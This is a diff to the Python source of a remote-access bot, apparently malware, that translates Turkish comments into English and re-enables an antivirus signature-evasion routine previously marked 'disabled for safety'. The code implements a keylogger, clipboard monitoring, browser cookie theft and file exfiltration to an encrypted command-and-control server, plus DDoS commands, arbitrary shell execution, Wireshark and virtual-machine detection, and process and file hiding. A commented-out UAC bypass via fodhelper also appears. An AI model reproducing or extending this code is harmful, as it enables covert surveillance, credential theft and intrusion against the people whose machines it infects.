@@ -1524,7 +1716,7 @@ class Bot:
                 else:
                     self._add_security_alert(
                         'analysis_tools_cleared',
-                        'Analiz araçları kapatıldı, güvenlik durumu normale döndü',
+                        'Analysis tools closed, security status returned to normal',
                         'LOW'
                     )
                     if hasattr(self, 'current_sock'):
@@ -1533,51 +1725,51 @@ class Bot:
             return analysis_detected
 
         except Exception as e:
-            print(f"[!] Process kontrol hatası: {str(e)}")
+            print(f"[!] Process check error: {str(e)}")
             return False
     
     def send_analysis_alert(self, sock, tool_detected=True):
-        """Analiz aracı tespit edildiğinde sunucuya bildirim gönderir"""
+        """Sends notification to server when analysis tool is detected"""
         try:
-            # Sunucuya tespit mesajı gönder
-            alert_type = "analiz_tespit" if tool_detected else "analiz_temiz"
+            # Send detection message to server
+            alert_type = "analysis_detected" if tool_detected else "analysis_clean"
             alert_message = json.dumps({
                 'bot_id': self.bot_id,
-                'output': f"Anti-Analiz Tespiti: {'WireShark Tespiti!' if tool_detected else 'WireShark kapatıldı, tekrar bağlanılıyor'}",
+                'output': f"Anti-Analysis Detection: {'WireShark Detection!' if tool_detected else 'WireShark closed, reconnecting'}",
                 'alert_type': alert_type,
                 'status': 'alert'
             }).encode('utf-8')
             
             encrypted_alert = self.encrypt_c2(alert_message)  # encrypt_c2 kullan
             sock.sendall(encrypted_alert)
-            print(f"[*] {'WireShark Tespiti!' if tool_detected else 'Analiz temiz'} mesajı sunucuya gönderildi")
+            print(f"[*] {'WireShark Detection!' if tool_detected else 'Analysis clean'} message sent to server")
             
-            # Sunucudan olası bir yanıt bekle
+            # Wait for possible response from server
             sock.settimeout(3)
             try:
                 response = sock.recv(1024)
                 if response:
-                    print("[*] Sunucu bildirim mesajını aldı")
+                    print("[*] Server received notification message")
             except socket.timeout:
-                pass  # Yanıt bekleme, sadece bildirim yap
+                pass  # Don't wait for response, just notify
                 
         except Exception as e:
-            print(f"[!] Analiz bildirim hatası: {str(e)}")
+            print(f"[!] Analysis notification error: {str(e)}")
 
     def keylogger_start(self):
         if self.keylogger_running:
-            return "Keylogger zaten çalışıyor"
+            return "Keylogger already running"
         self.keylogger_running = True
         self.keylogger_thread = threading.Thread(target=self._keylogger_loop, daemon=True)
         self.keylogger_thread.start()
-        return "Keylogger başlatıldı"
+        return "Keylogger started"
 
     def _keylogger_loop(self):
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock.connect((self.kserver_host, self.kserver_port))
         
-            # Bot ID'yi şifrele ve gönder
+            # Encrypt and send bot ID
             encrypted_bot_id = self.encrypt_data(self.bot_id)
             sock.sendall(encrypted_bot_id)
 
@@ -1587,7 +1779,7 @@ class Bot:
                     timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")
                     log_data = f"{timestamp}: {key_str}\n"
                 
-                    # Tuş verisini şifrele
+                    # Encrypt key data
                     encrypted_log = self.encrypt_data(log_data)
                     sock.sendall(encrypted_log)
                 except Exception as e:
@@ -1614,56 +1806,56 @@ class Bot:
             return '[BACKSPACE]'
         elif key == keyboard.Key.tab:
             return '[TAB]'
-        else:  # Diğer özel tuşlar
+        else:  # Other special keys
             return f'[{key}]'
     
     def _stop_keylogger(self):
-        """Keylogger'ı güvenle durdurur"""
+        """Stops keylogger safely"""
         self.keylogger_running = False
         if self.keylogger_thread:
             self.keylogger_thread.join()
     
     def keylogger_stop(self):
         self._stop_keylogger()
-        return "Keylogger durduruldu"
+        return "Keylogger stopped"
         
     def clipboard_start(self):
-        """Clipboard izlemeyi başlatır"""
+        """Starts clipboard monitoring"""
         if self.clipboard_active:
             return "Clipboard logger is already running"
     
-        # Mevcut bağlantıyı kaydet
+        # Save current connection
         try:
             if not hasattr(self, 'current_sock') or not self.current_sock:
                 self.current_sock = self.connect()
                 if not self.current_sock:
-                    return "Sunucuya bağlantı kurulamadı, clipboard başlatılamadı."
+                    return "Could not connect to server, clipboard could not be started."
         except Exception as e:
-            return f"Sunucu bağlantı hatası: {str(e)}"
+            return f"Server connection error: {str(e)}"
     
         self.clipboard_active = True
     
-        # Yeni bir thread başlat
+        # Start new thread
         self.clipboard_thread = threading.Thread(target=self._clipboard_monitor, daemon=True)
         self.clipboard_thread.start()
     
-        return "Clipboard izleme başlatıldı"
+        return "Clipboard monitoring started"
     
     def clipboard_stop(self):
-        """Clipboard izlemeyi durdurur"""
+        """Stops clipboard monitoring"""
         if not self.clipboard_active:
-            return "Clipboard logger zaten çalışmıyor"
+            return "Clipboard logger not running"
             
         self.clipboard_active = False
         
-        # Thread'in durmasını bekle
+        # Wait for thread to stop
         if self.clipboard_thread and self.clipboard_thread.is_alive():
             self.clipboard_thread.join(timeout=1.0)
             
-        return "Clipboard logger durduruldu"
+        return "Clipboard logger stopped"
     
     def _clipboard_monitor(self):
-        """Clipboard'ı izler ve sunucuya gönderir"""
+        """Monitors clipboard and sends to server"""
         import pyperclip
         
         last_content = ""
@@ -1673,49 +1865,49 @@ class Bot:
                 current_content = pyperclip.paste()
                 
                 if current_content != last_content and current_content.strip():
-                    # Yeni içerik varsa sunucuya gönder
+                    # Send to server if new content
                     self._send_clipboard_data(current_content)
                     last_content = current_content
                 
-                time.sleep(1)  # 1 saniye bekle
+                time.sleep(1)  # Wait 1 second
                 
             except Exception as e:
                 print(f"Clipboard monitoring error: {e}")
                 time.sleep(5)  # Hata durumunda 5 saniye bekle
     
     def _send_clipboard_data(self, data):
-        """Clipboard verisini sunucuya gönderir"""
+        """Sends clipboard data to server"""
         try:
-            # Sunucuya gönderilecek mesajı hazırla
+            # Prepare message to send to server
             message = {
                 'bot_id': self.bot_id,
                 'action': 'clipboard_data',
                 'data': data
             }
             
-            # JSON olarak kodla
+            # Encode as JSON
             message_json = json.dumps(message)
             
-            # Şifrele
+            # Encrypt
             encrypted_data = self.encrypt_c2(message_json)  # encrypt_c2 kullan
-            # Aktif bağlantı varsa gönder
+            # Send if active connection exists
             if self.current_sock:
                 self.current_sock.sendall(encrypted_data)
-                print(f"[+] Clipboard verisi sunucuya gönderildi ({len(data)} bayt)")
+                print(f"[+] Clipboard data sent to server ({len(data)} bytes)")
             else:
-                print("[!] Sunucu bağlantısı yok, clipboard verisi gönderilemedi")
+                print("[!] No server connection, clipboard data could not be sent")
                 
         except Exception as e:
-            print(f"[!] Clipboard veri gönderme hatası: {e}")
+            print(f"[!] Clipboard data sending error: {e}")
     
     def steal_cookies(self):
-        """Tüm tarayıcılardan çerezleri çalar"""
+        """Steals cookies from all browsers"""
         try:
             import browser_cookie3
             cookies = []
             last_error = None
             
-            # Tüm tarayıcıları kontrol et
+            # Check all browsers
             for browser_type in [browser_cookie3.chrome, browser_cookie3.firefox, 
                                browser_cookie3.edge, browser_cookie3.opera]:
                 try:
@@ -1748,7 +1940,7 @@ class Bot:
                 'message': f'Failed to steal cookies: {str(e)}'
             }
 
-    # download_file fonksiyonu kaldırıldı - token sistemi gereksiz
+    # download_file function removed - token system unnecessary
     
     def list_files(self):
         """List available files on the file server"""
@@ -1838,19 +2030,19 @@ class Bot:
                 except Exception as e:
                     return False, f"Invalid token info: {str(e)}"
 
-            # Keylogger komutları
+            # Keylogger commands
             if command == "keylogger_start":
                 return self.keylogger_start()
             elif command == "keylogger_stop":
                 return self.keylogger_stop()
             
-            # Screenshot komutları
+            # Screenshot commands
             elif command == "ss_start":
                 return self.screenshot_start()
             elif command == "ss_stop":
                 return self.screenshot_stop()
             
-            # DDoS komutları
+            # DDoS commands
             elif command.startswith("ddos_start"):
                 try:
                     parts = command.split('|')
@@ -1864,13 +2056,13 @@ class Bot:
             elif command == "ddos_stop":
                 return self.ddos_stop()
             
-            # Clipboard komutları
+            # Clipboard commands
             elif command == "clipboard_start":
                 return self.clipboard_start()
             elif command == "clipboard_stop":
                 return self.clipboard_stop()
             
-            # Cookie komutları
+            # Cookie commands
             elif command == "get_cookies":
                 cookies = self.steal_cookies()
                 if isinstance(cookies, list):
@@ -1880,14 +2072,14 @@ class Bot:
                 else:
                     return json.dumps({'status': 'error', 'message': cookies})
             
-            # System Information komutları
+            # System Information commands
             
-            # Bot kontrol komutları
+            # Bot control commands
             elif command == "stop":
                 self.running = False
                 return "Bot shutting down..."
             
-            # Tor komutları
+            # Tor commands
             elif command == "tor enable":
                 self.tor_enabled = True
                 self.communication_config['tor_enabled'] = True
@@ -1912,14 +2104,28 @@ class Bot:
             # AI Commands : Disabled :(
             
             elif command == "signature_evasion":
-                return json.dumps({
-                    'status': 'disabled',
-                    'message': 'Signature evasion is disabled for safety.'
-                })
+                try:
+                    result = self.signature_evasion_system()
+                    if result:
+                        return json.dumps({
+                            'status': 'success',
+                            'message': 'Signature evasion activated',
+                            'result': result
+                        }, indent=2)
+                    else:
+                        return json.dumps({
+                            'status': 'error',
+                            'message': 'Signature evasion failed'
+                        })
+                except Exception as e:
+                    return json.dumps({
+                        'status': 'error',
+                        'message': f'Signature evasion error: {str(e)}'
+                    })
             
             # AI Status : Disabled :(
             
-            # Vulnerability Scanner komutları
+            # Vulnerability Scanner commands
             elif command == "vuln_scan":
                 # Vulnerability Scanner : Disabled :(
                 # ExploitDB : Disabled :(
@@ -1932,7 +2138,7 @@ class Bot:
                 })
             
             elif command == "vuln_status":
-                # Zafiyet tarayıcı durumu
+                # Vulnerability scanner status
                 # Vulnerability Scanner : Disabled :(
                 return json.dumps({
                     'vuln_scanner_enabled': False,
@@ -1972,7 +2178,7 @@ class Bot:
                 }, indent=2)
             
             elif command == "auto_vuln_research":
-                # Otomatik zafiyet araştırmaları : Disabled :(
+                # Automatic vulnerability research : Disabled :(
                 return json.dumps({
                     'status': 'disabled',
                     'message': 'Auto vulnerability research is disabled for safety.'
@@ -1983,26 +2189,26 @@ class Bot:
                 else:
                     return result
             
-            # Network Mapping komutları
+            # Network Mapping commands
             elif command.startswith("network_map_start"):
-                # Network mapping başlat
+                # Start network mapping
                 parts = command.split()
                 scope = parts[1] if len(parts) > 1 else '192.168.1.0/24'
                 result = self.start_network_mapping(scope)
                 return json.dumps(result, indent=2)
             
             elif command == "network_map_status":
-                # Network mapping durumu
+                # Network mapping status
                 status = self.get_network_mapping_status()
                 return json.dumps(status, indent=2)
             
             elif command == "network_map_stop":
-                # Network mapping durdur
+                # Stop network mapping
                 result = self.stop_network_mapping()
                 return json.dumps(result, indent=2)
             
             elif command == "network_maps":
-                # Tüm network haritalarını göster
+                # Show all network maps
                 maps_info = {
                     'active_mappings': self.network_mapping_active,
                     'current_scope': self.current_scope,
@@ -2013,12 +2219,12 @@ class Bot:
                 }
                 return json.dumps(maps_info, indent=2)
             
-            # Güvenlik Komutları
+            # Security Commands
             elif command == "alerts":
-                # Güvenlik uyarılarını göster
+                # Show security alerts
                 alerts_info = {
                     'total_alerts': len(self.security_alerts),
-                    'recent_alerts': self.security_alerts[-10:] if self.security_alerts else [],  # Son 10 uyarı
+                    'recent_alerts': self.security_alerts[-10:] if self.security_alerts else [],  # Last 10 alerts
                     'alert_types': {
                         'analysis_detected': len([a for a in self.security_alerts if 'analysis' in a.get('type', '')]),
                         'vm_detected': len([a for a in self.security_alerts if 'vm' in a.get('type', '')]),
@@ -2029,7 +2235,7 @@ class Bot:
                 return json.dumps(alerts_info, indent=2)
             
             elif command == "security":
-                # Güvenlik kuralları durumu
+                # Security rules status
                 security_status = {
                     'security_rules': self.security_rules,
                     'anti_analysis_mode': self.anti_analysis_mode,
@@ -2040,9 +2246,9 @@ class Bot:
                 }
                 return json.dumps(security_status, indent=2)
             
-            # Web Dashboard Komutları
+            # Web Dashboard Commands
             elif command == "web_status":
-                # Web dashboard durumu
+                # Web dashboard status
                 web_status = {
                     'web_dashboard_enabled': hasattr(self, 'web_dashboard_active'),
                     'web_dashboard_active': getattr(self, 'web_dashboard_active', False),
@@ -2051,29 +2257,29 @@ class Bot:
                 }
                 return json.dumps(web_status, indent=2)
             
-            # Dosya işlemleri
+            # File operations
             
             elif command.startswith("file_download "):
-                # Dosya indirme
+                # File download
                 remote_path = command.split()[1]
                 return self.handle_file_download(remote_path)
             
             elif command.startswith("download "):
-                # Basit dosya indirme sistemi
+                # Simple file download system
                 parts = command.split()
                 if len(parts) >= 3:
                     target_bot_id = parts[1]
-                    remote_path = ' '.join(parts[2:])  # Boşluklu yollar için
+                    remote_path = ' '.join(parts[2:])  # For paths with spaces
                     
-                    # Sadece bu bot'un ID'si eşleşiyorsa işlem yap
+                    # Only process if this bot's ID matches
                     if target_bot_id == self.bot_id:
                         return self.handle_file_download(remote_path)
                     else:
-                        return f"Bu bot ID'si ({self.bot_id}) hedef bot ID'si ({target_bot_id}) ile eşleşmiyor"
+                        return f"This bot ID ({self.bot_id}) does not match target bot ID ({target_bot_id})"
                 else:
-                    return "Kullanım: download <Bot-ID> <Remote-Path>"
+                    return "Usage: download <Bot-ID> <Remote-Path>"
             
-            # P2P komutları
+            # P2P commands
             elif command == "p2p_start":
                 return self.start_p2p()
             
@@ -2110,7 +2316,7 @@ class Bot:
                 return self.list_directory()
             
             elif command == "communication_status":
-                # Gelişmiş iletişim durumu
+                # Advanced communication status
                 status = {
                     'current_channel': self.connection_rotation['current_channel'],
                     'communication_config': self.communication_config,
@@ -2124,13 +2330,13 @@ class Bot:
                 return json.dumps(status, indent=2)
             
             elif command == "system_copy":
-                # Sistem kopyalama komutu
+                # System copy command
                 # copy_result = self._auto_system_copy() # Disabled for safety
                 copy_result = {"status": "disabled", "message": "Auto-copy disabled for safety"}
                 return json.dumps(copy_result, indent=2)
             
             elif command == "copy_status":
-                # Sistem kopyalama durumu
+                # System copy status
                 status = {
                     'system_copies': getattr(self, 'system_copies', []),
                     'persistence_mechanisms': getattr(self, 'persistence_mechanisms', []),
@@ -2139,9 +2345,9 @@ class Bot:
                 }
                 return json.dumps(status, indent=2)
             
-            # Sistem komutları
+            # System commands
             elif command == "isvm":
-                return "Sanal Makine Tespiti" if self.is_vm() else "Sanal Makine Yok"
+                return "Virtual Machine Detected" if self.is_vm() else "No Virtual Machine"
             
             elif command == "system_info":
                 # Detailed system information with mesh status
@@ -2234,23 +2440,23 @@ class Bot:
                     if psutil:
                         print("Collecting process information...")
                         
-                        # İlk önce tüm process'lerin CPU baseline'ını oluştur
+                        # First, create CPU baseline for all processes
                         all_procs = list(psutil.process_iter())
                         for p in all_procs:
                             try:
-                                p.cpu_percent()  # İlk çağrı - baseline oluşturur
+                                p.cpu_percent()  # First call - creates baseline
                             except:
                                 pass
                         
-                        # Kısa bir bekleme
+                        # Short wait
                         import time
                         time.sleep(0.5)
                         
-                        # Şimdi gerçek CPU yüzdelerini al
+                        # Now get actual CPU percentages
                         for proc in all_procs:
                             try:
                                 proc_info = proc.as_dict(['pid', 'name', 'memory_percent', 'status', 'create_time'])
-                                cpu_percent = proc.cpu_percent()  # İkinci çağrı - gerçek değer
+                                cpu_percent = proc.cpu_percent()  # Second call - actual value
                                 
                                 processes.append({
                                     'pid': proc_info['pid'],
@@ -2263,13 +2469,13 @@ class Bot:
                             except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                                 continue
                         
-                        # CPU kullanımına göre sırala
+                        # Sort by CPU usage
                         processes.sort(key=lambda x: x['cpu_percent'], reverse=True)
                         
-                        # İlk 20 process'i al
+                        # Get first 20 processes
                         processes = processes[:20]
                         
-                        # Toplam bilgileri ekle
+                        # Add total information
                         total_processes = len(psutil.pids())
                         total_cpu = sum(p['cpu_percent'] for p in processes)
                         total_memory = sum(p['memory_percent'] for p in processes)
@@ -2303,7 +2509,7 @@ class Bot:
             
             
             
-            # Genel komut çalıştırma
+            # General command execution
             else:
                 if self.platform == 'windows':
                     result = subprocess.check_output(
@@ -2329,7 +2535,7 @@ class Bot:
             return f"Execution error: {str(e)}"
     
     def is_vm(self):
-        """Sanal makine kontrolü yapar"""
+        """Checks for virtual machine"""
         vm_indicators = [
             "vbox", "vmware", "qemu", "virtual", "hyperv", "kvm", "xen",
             "docker", "lxc", "parallels", "aws", "azure", "google"
@@ -2337,9 +2543,9 @@ class Bot:
         
         detected_vm = None
         
-        # Donanım ve sistem bilgilerini kontrol et
+        # Check hardware and system information
         try:
-            # Windows için WMI sorgusu
+            # WMI query for Windows
             if self.platform == 'windows':
                 output = subprocess.check_output(
                     "wmic computersystem get manufacturer,model",
@@ -2347,7 +2553,7 @@ class Bot:
                     stderr=subprocess.PIPE,
                     universal_newlines=True
                 ).lower()
-            else:  # Linux/Mac için
+            else:  # For Linux/Mac
                 output = subprocess.check_output(
                     "cat /proc/cpuinfo; dmesg; lscpu",
                     shell=True,
@@ -2356,43 +2562,43 @@ class Bot:
                     executable='/bin/bash'
                 ).lower()
             
-            # VM belirteçlerini kontrol et
+            # Check VM indicators
             for indicator in vm_indicators:
                 if indicator in output:
                     detected_vm = indicator.upper()
                     break
                     
-            # Diğer kontrol yöntemleri
+            # Other detection methods
             if os.path.exists("/.dockerenv"):
                 detected_vm = "DOCKER"
                 
             if os.path.exists("/dev/vboxguest"):
                 detected_vm = "VIRTUALBOX"
                 
-            # VM tespit edildiyse uyarı ekle
+            # Add alert if VM detected
             if detected_vm:
                 self._add_security_alert(
                     'vm_detected',
-                    f'Sanal makine tespit edildi: {detected_vm}',
+                    f'Virtual machine detected: {detected_vm}',
                     'HIGH'
                 )
                 return True
                 
         except Exception as e:
-            print(f"[!] VM kontrol hatası: {str(e)}")
+            print(f"[!] VM check error: {str(e)}")
             
         return False
     
     
     
     def handle_file_download(self, remote_path):
-        """Basit dosya indirme - token sistemi yok"""
+        """Simple file download - no token system"""
         try:
-            # Dosya var mı kontrol et
+            # Check if file exists
             if not os.path.exists(remote_path):
-                return f"Dosya bulunamadı: {remote_path}"
+                return f"File not found: {remote_path}"
             
-            # Dosyayı oku
+            # Read file
             with open(remote_path, 'rb') as f:
                 file_content = f.read()
             
@@ -2400,7 +2606,7 @@ class Bot:
             import base64
             b64_content = base64.b64encode(file_content).decode('utf-8')
             
-            # Server'a gönder
+            # Send to server
             download_data = {
                 'bot_id': self.bot_id,
                 'action': 'file_download',
@@ -2412,32 +2618,32 @@ class Bot:
                 'file_content': b64_content
             }
             
-            # Encrypt ve gönder
+            # Encrypt and send
             if self.current_sock:
                 encrypted_data = self.encrypt_c2(json.dumps(download_data))
                 self.current_sock.sendall(struct.pack('!I', len(encrypted_data)) + encrypted_data)
-                return f"Dosya gönderildi: {os.path.basename(remote_path)} ({len(file_content)} bytes)"
+                return f"File sent: {os.path.basename(remote_path)} ({len(file_content)} bytes)"
             else:
-                return "Bağlantı yok - dosya gönderilemedi"
+                return "No connection - file could not be sent"
             
         except Exception as e:
-            return f"Dosya indirme hatası: {str(e)}"
+            return f"File download error: {str(e)}"
     
     def handle_advanced_download(self, remote_path):
-        """Gelişmiş dosya indirme sistemi"""
+        """Advanced file download system"""
         try:
-            print(f"\033[94m[Download] 🔍 Dosya yolu aranıyor: {remote_path}\033[0m")
+            print(f"\033[94m[Download] 🔍 Searching for file path: {remote_path}\033[0m")
             
-            # Dosya/klasör varlığını kontrol et
+            # Check file/folder existence
             if not os.path.exists(remote_path):
                 return json.dumps({
                     'status': 'error',
-                    'message': f'Dosya/klasör bulunamadı: {remote_path}',
+                    'message': f'File/folder not found: {remote_path}',
                     'bot_id': self.bot_id,
                     'remote_path': remote_path
                 }, indent=2)
             
-            # Klasör kontrolü
+            # Folder check
             if os.path.isdir(remote_path):
                 folder_data = {
                     'bot_id': self.bot_id,
@@ -2447,27 +2653,27 @@ class Bot:
                     'folder_size': self._get_folder_size(remote_path)
                 }
                 
-                # Sunucuya gönder
+                # Send to server
                 if self.current_sock:
                     encrypted_data = self.encrypt_c2(json.dumps(folder_data))  # encrypt_c2 kullan
                     self.current_sock.sendall(struct.pack('!I', len(encrypted_data)) + encrypted_data)
                 
                 return json.dumps({
                     'status': 'folder_detected',
-                    'message': f'Klasör tespit edildi (indirilmez): {remote_path}',
+                    'message': f'Folder detected (not downloadable): {remote_path}',
                     'bot_id': self.bot_id,
                     'remote_path': remote_path,
                     'folder_contents': folder_data['folder_contents'],
                     'folder_size': folder_data['folder_size']
                 }, indent=2)
             
-            # Dosya kontrolü
+            # File check
             if os.path.isfile(remote_path):
                 return self._download_single_file(remote_path)
             
             return json.dumps({
                 'status': 'error',
-                'message': f'Geçersiz dosya/klasör: {remote_path}',
+                'message': f'Invalid file/folder: {remote_path}',
                 'bot_id': self.bot_id,
                 'remote_path': remote_path
             }, indent=2)
@@ -2475,29 +2681,29 @@ class Bot:
         except Exception as e:
             return json.dumps({
                 'status': 'error',
-                'message': f'Download hatası: {str(e)}',
+                'message': f'Download error: {str(e)}',
                 'bot_id': self.bot_id,
                 'remote_path': remote_path
             }, indent=2)
     
     def _download_single_file(self, file_path):
-        """Tek dosya indirme"""
+        """Single file download"""
         try:
-            # Dosya bilgilerini al
+            # Get file information
             file_size = os.path.getsize(file_path)
             file_name = os.path.basename(file_path)
             file_extension = os.path.splitext(file_path)[1]
             
-            print(f"\033[94m[Download] 📁 Dosya bulundu: {file_name} ({file_size} bytes)\033[0m")
+            print(f"\033[94m[Download] 📁 File found: {file_name} ({file_size} bytes)\033[0m")
             
-            # Dosyayı oku
+            # Read file
             with open(file_path, 'rb') as f:
                 file_content = f.read()
             
-            # Dosya hash'ini hesapla
+            # Calculate file hash
             file_hash = hashlib.md5(file_content).hexdigest()
             
-            # Sunucuya gönderilecek veri
+            # Data to send to server
             download_data = {
                 'bot_id': self.bot_id,
                 'action': 'file_download',
@@ -2512,22 +2718,22 @@ class Bot:
                 'file_content': base64.b64encode(file_content).decode('utf-8')
             }
             
-            # Sunucuya gönder
+            # Send to server
             if self.current_sock:
                 encrypted_data = self.encrypt_c2(json.dumps(download_data))  # encrypt_c2 kullan
                 self.current_sock.sendall(struct.pack('!I', len(encrypted_data)) + encrypted_data)
-                print(f"\033[92m[Download] ✅ Dosya sunucuya gönderildi: {file_name}\033[0m")
+                print(f"\033[92m[Download] ✅ File sent to server: {file_name}\033[0m")
                 
                 return json.dumps({
                     'status': 'success',
-                    'message': f'Dosya başarıyla indirildi: {file_name}',
+                    'message': f'File successfully downloaded: {file_name}',
                     'bot_id': self.bot_id,
                     'file_info': download_data['file_info']
                 }, indent=2)
             else:
                 return json.dumps({
                     'status': 'error',
-                    'message': 'Sunucu bağlantısı yok',
+                    'message': 'No server connection',
                     'bot_id': self.bot_id,
                     'file_path': file_path
                 }, indent=2)
@@ -2535,13 +2741,13 @@ class Bot:
         except Exception as e:
             return json.dumps({
                 'status': 'error',
-                'message': f'Dosya okuma hatası: {str(e)}',
+                'message': f'File reading error: {str(e)}',
                 'bot_id': self.bot_id,
                 'file_path': file_path
             }, indent=2)
     
     def _list_folder_contents(self, folder_path):
-        """Klasör içeriğini listele"""
+        """List folder contents"""
         try:
             contents = []
             for item in os.listdir(folder_path):
@@ -2558,7 +2764,7 @@ class Bot:
             return [{'error': str(e)}]
     
     def _get_folder_size(self, folder_path):
-        """Klasör boyutunu hesapla"""
+        """Calculate folder size"""
         try:
             total_size = 0
             for dirpath, dirnames, filenames in os.walk(folder_path):
@@ -2607,7 +2813,7 @@ class Bot:
     #        if not winreg:
     #            return False
             
-            # Registry key oluştur
+            # Create registry key
     #        key_path = r"Software\Classes\ms-settings\Shell\Open\command"
             
     #        with winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path) as key:
@@ -2617,7 +2823,7 @@ class Bot:
     #        # fodhelper.exe çalıştır
     #        subprocess.Popen("C:\\Windows\\System32\\fodhelper.exe", shell=True)
             
-            # Registry'yi temizle
+            # Clean registry
     #        time.sleep(2)
     #        winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
             
@@ -2654,7 +2860,7 @@ class Bot:
     #        pass
     
     def _enable_process_hiding(self):
-        """Process hiding aktifleştir"""
+        """Enable process hiding"""
         try:
             if self.platform == 'windows':
                 self._hide_windows_process()
@@ -2683,7 +2889,7 @@ class Bot:
             pass
     
     def _enable_file_hiding(self):
-        """File hiding aktifleştir"""
+        """Enable file hiding"""
         try:
             if self.platform == 'windows':
                 self._hide_windows_files()
@@ -2947,7 +3153,7 @@ class Bot:
                 except:
                     continue
             
-            # Kernel modülleri kontrol et
+            # Check kernel modules
             try:
                 with open('/proc/modules', 'r') as f:
                     modules = f.read().lower()
@@ -2976,7 +3182,7 @@ class Bot:
             except:
                 pass
             
-            # PCI cihazları kontrol et
+            # Check PCI devices
             try:
                 result = subprocess.check_output(['lspci'], text=True, stderr=subprocess.DEVNULL)
                 vm_pci = ['virtualbox', 'vmware', 'qemu', 'red hat']
@@ -3056,7 +3262,7 @@ class Bot:
         return indicators
     
     def get_current_user(self):
-        """Mevcut kullanıcıyı döndür (whoami komutu)"""
+        """Returns current user (whoami command)"""
         try:
             if self.platform == 'windows':
                 return os.environ.get('USERNAME', 'Unknown')
@@ -3066,14 +3272,14 @@ class Bot:
             return "Unknown"
     
     def get_current_directory(self):
-        """Mevcut dizini döndür (pwd komutu)"""
+        """Returns current directory (pwd command)"""
         try:
             return os.getcwd()
         except:
             return "Unknown"
     
     def list_directory(self):
-        """Dizin içeriğini listele (ls komutu)"""
+        """List directory contents (ls command)"""
         try:
             current_dir = os.getcwd()
             items = os.listdir(current_dir)
@@ -3081,7 +3287,7 @@ class Bot:
             result = f"📁 Directory: {current_dir}\n"
             result += f"{'='*50}\n"
             
-            # Dosya ve klasörleri ayır
+            # Separate files and folders
             dirs = []
             files = []
             
@@ -3092,14 +3298,14 @@ class Bot:
                 else:
                     files.append(item)
             
-            # Klasörleri listele
+            # List folders
             if dirs:
                 result += f"📂 Directories ({len(dirs)}):\n"
                 for directory in sorted(dirs):
                     result += f"  📁 {directory}/\n"
                 result += "\n"
             
-            # Dosyaları listele
+            # List files
             if files:
                 result += f"📄 Files ({len(files)}):\n"
                 for file in sorted(files):
@@ -3115,10 +3321,10 @@ class Bot:
         except Exception as e:
             return f"❌ Directory listing error: {str(e)}"
 
-    # AI Destekli Özellikler
+    # AI Supported Features
     
     def _get_service_name(self, port):
-        """Port numarasına göre servis adını döndürür"""
+        """Returns service name by port number"""
         service_map = {
             21: 'FTP', 22: 'SSH', 23: 'Telnet', 25: 'SMTP', 53: 'DNS',
             80: 'HTTP', 110: 'POP3', 143: 'IMAP', 443: 'HTTPS',
@@ -3128,31 +3334,31 @@ class Bot:
         return service_map.get(port, 'Unknown')
     
     def _calculate_security_score(self, analysis_result):
-        """Güvenlik seviyesini hesaplar"""
+        """Calculates security level"""
         score = 0
         
-        # Port sayısına göre
+        # Based on port count
         open_ports = len(analysis_result['open_ports'])
         if open_ports <= 2:
-            score += 30  # Düşük risk
+            score += 30  # Low risk
         elif open_ports <= 5:
-            score += 50  # Orta risk
+            score += 50  # Medium risk
         else:
-            score += 70  # Yüksek risk
+            score += 70  # High risk
         
-        # Kritik servisler
+        # Critical services
         critical_services = [22, 23, 3389]  # SSH, Telnet, RDP
         for port in analysis_result['open_ports']:
             if port in critical_services:
                 score += 20
         
-        # HTTP/HTTPS kontrolü
+        # HTTP/HTTPS check
         if 80 in analysis_result['open_ports']:
             score += 10
         if 443 in analysis_result['open_ports']:
-            score += 5  # HTTPS daha güvenli
+            score += 5  # HTTPS is more secure
         
-        # Skor değerlendirmesi
+        # Score evaluation
         if score <= 30:
             return "LOW"
         elif score <= 60:
@@ -3161,7 +3367,7 @@ class Bot:
             return "HIGH"
     
     def _calculate_attack_difficulty(self, analysis_result):
-        """Saldırı zorluğunu hesaplar"""
+        """Calculates attack difficulty"""
         difficulty = 0
         
         security_level = analysis_result['security_level']
@@ -3172,14 +3378,14 @@ class Bot:
         else:
             difficulty = "HARD"
         
-        # Özel durumlar
-        if 22 in analysis_result['open_ports']:  # SSH varsa
-            difficulty = "HARD"  # SSH genelde güvenli
+        # Special cases
+        if 22 in analysis_result['open_ports']:  # If SSH exists
+            difficulty = "HARD"  # SSH is generally secure
         
         return difficulty
     
     def _recommend_attack_method(self, analysis_result):
-        """Önerilen saldırı yöntemini belirler"""
+        """Determines recommended attack method"""
         open_ports = analysis_result['open_ports']
         security_level = analysis_result['security_level']
         
@@ -3229,40 +3435,40 @@ class Bot:
         return vulnerabilities
     
     def signature_evasion_system(self):
-        """Antivirus imzalarını atlatma sistemi"""
+        """Antivirus signature evasion system"""
         try:
-            print(f"\033[94m[AI] Signature evasion sistemi başlatılıyor...\033[0m")
+            print(f"\033[94m[AI] Signature evasion system starting...\033[0m")
             
-            # Mevcut imzaları kontrol et
+            # Check current signatures
             current_signatures = self._detect_current_signatures()
             
-            # Evasion tekniklerini uygula
+            # Apply evasion techniques
             evasion_result = self._apply_evasion_techniques()
             
-            # Başarı oranını güncelle
+            # Update success rate
             self.evasion_success_rate = evasion_result['success_rate']
             
-            print(f"\033[92m[AI] Evasion sistemi tamamlandı:\033[0m")
-            print(f"  \033[96m•\033[0m Başarı Oranı: {self.evasion_success_rate}%")
-            print(f"  \033[96m•\033[0m Uygulanan Teknikler: {len(evasion_result['applied_techniques'])}")
-            print(f"  \033[96m•\033[0m Tespit Edilen İmzalar: {len(current_signatures)}")
+            print(f"\033[92m[AI] Evasion system completed:\033[0m")
+            print(f"  \033[96m•\033[0m Success Rate: {self.evasion_success_rate}%")
+            print(f"  \033[96m•\033[0m Applied Techniques: {len(evasion_result['applied_techniques'])}")
+            print(f"  \033[96m•\033[0m Detected Signatures: {len(current_signatures)}")
             
             return evasion_result
             
         except Exception as e:
-            print(f"\033[91m[AI] Evasion sistemi hatası: {str(e)}\033[0m")
+            print(f"\033[91m[AI] Evasion system error: {str(e)}\033[0m")
             return None
     
     def _detect_current_signatures(self):
-        """Mevcut antivirus imzalarını tespit eder"""
+        """Detects current antivirus signatures"""
         signatures = set()
         
         try:
-            # Dosya hash'lerini kontrol et
+            # Check file hashes
